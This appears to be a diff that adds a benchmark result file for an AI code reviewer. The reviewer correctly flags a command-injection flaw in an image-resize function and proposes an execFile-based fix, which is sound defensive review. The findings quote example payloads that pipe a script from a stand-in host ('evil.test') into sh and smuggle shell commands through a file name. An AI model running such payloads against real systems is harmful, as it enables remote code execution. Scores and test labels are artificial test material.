@@ -1,0 +1,92 @@
+{
+  "case": "C070",
+  "pr": "C070",
+  "repo": "fixture",
+  "provider": "grok",
+  "api_base": "",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "4e469f0c6687",
+  "turns": 4,
+  "tool_calls": null,
+  "seconds": 80.3,
+  "setup_seconds": 0.0,
+  "total_seconds": 80.3,
+  "usage": {
+    "in": 60573,
+    "cache_read": 61184,
+    "cache_write": 0,
+    "out": 3778,
+    "source": "cli"
+  },
+  "cost_usd": 0.1621692,
+  "changed_files": [
+    "src/images/resize.ts"
+  ],
+  "findings": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity": "critical",
+      "body": "**Issue:** `execFile` (no shell, argv-safe) was replaced with `exec`, and both `src` and `filter` are interpolated into a shell command string. Any caller-controlled value becomes shell syntax.\n\n**Failure mode:** `filter` = `Lanczos; curl http://evil.test/pwn.sh | sh` or `src` = `x\"; id > /tmp/pwned; echo \"` executes arbitrary commands on the runner/host. Quoting `\"${src}\"` does not stop quote-breaking payloads; `filter` is unquoted entirely. The comment that `-filter` needs a shell is false \u2014 pass it as an argv element.\n\n**Fix:** restore `execFile` / `spawn` with `shell: false` and an allowlisted filter:\n\n```ts\nimport { execFile } from \"child_process\";\n\nconst ALLOWED_FILTERS = new Set([\"Lanczos\", \"Mitchell\", \"Catrom\", \"Point\", \"Box\"]);\n\nexport function resize(src: string, filter: string, w: number): Promise<string> {\n  if (!ALLOWED_FILTERS.has(filter)) {\n    return Promise.reject(new Error(`unsupported filter: ${filter}`));\n  }\n  if (!Number.isFinite(w) || w <= 0) {\n    return Promise.reject(new Error(\"invalid width\"));\n  }\n  return new Promise((res, rej) => {\n    execFile(\"convert\", [src, \"-filter\", filter, \"-resize\", `${w}x`, \"/tmp/out.png\"], (e) =>\n      e ? rej(e) : res(\"/tmp/out.png\")\n    );\n  });\n}\n```"
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 3,
+      "severity": "warning",
+      "body": "**Issue:** `resize(src, w)` became `resize(src, filter, w)`. Existing callers that still pass a numeric width as the second argument will coerce that number into the shell filter slot and shift meaning of later args (or fail at runtime).\n\n**Fix:** add the new parameter at the end (`resize(src, w, filter?)`) with a safe default, or version/rename the export (`resizeWithFilter`) so current call sites keep compiling with the old contract."
+    }
+  ],
+  "summary": "## Verdict\n\n**Do not merge** \u2014 this change introduces a critical command-injection vulnerability by replacing safe `execFile` argv invocation with shell `exec` and interpolating caller-controlled `src` and `filter` into the command string.\n\n## Analysis\n\n`resize` previously used `execFile(\"convert\", [src, \"-resize\", ...])`, which never invokes a shell and treats path/flag values as literal argv. The new code builds:\n\n```ts\nexec(`convert \"${src}\" -filter ${filter} -resize ${w}x /tmp/out.png`, ...)\n```\n\nFailure mode is straightforward. A filter like `Lanczos; curl evil.test | sh` or a src like `\"image.png\"; id > /tmp/pwned; echo \"` runs arbitrary commands on the host with the process privileges. Double-quoting `src` does not help against quote-breaking payloads; `filter` is entirely unquoted. The inline comment that `-filter` needs a shell is incorrect: ImageMagick filter names and geometry still belong on an argv list via `execFile`/`spawn` with `shell: false`.\n\nThe signature change (`filter` inserted before `w`) is also a breaking API shift for any existing callers, though none appear in this repository snapshot.\n\n## Recommendation\n\nKeep `execFile` (or `spawn` with an argument array). Pass `-filter` and a validated allowlisted filter name as separate argv entries. Reject filter values outside ImageMagick's known filter set if custom filters are required \u2014 still without a shell.\n\n**Recommendation:** request-changes",
+  "verification": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The patch replaces safe execFile argv invocation with exec() and interpolates unsanitized src and filter into a shell command string; filter is unquoted and src quoting is breakable, so caller-controlled values yield arbitrary command execution. Base used execFile without a shell, so this is a real "
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 3,
+      "severity_claimed": "warning",
+      "status": "verified",
+      "reason": "The export changed from `resize(src: string, w: number)` to `resize(src: string, filter: string, w: number)`, inserting a required `filter` before width and breaking the prior contract for any existing callers."
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 2,
+    "seconds": 22.395,
+    "verified": 2,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 0,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 6884,
+      "out": 752
+    },
+    "cost_usd": 0.019944
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C070-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 0,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
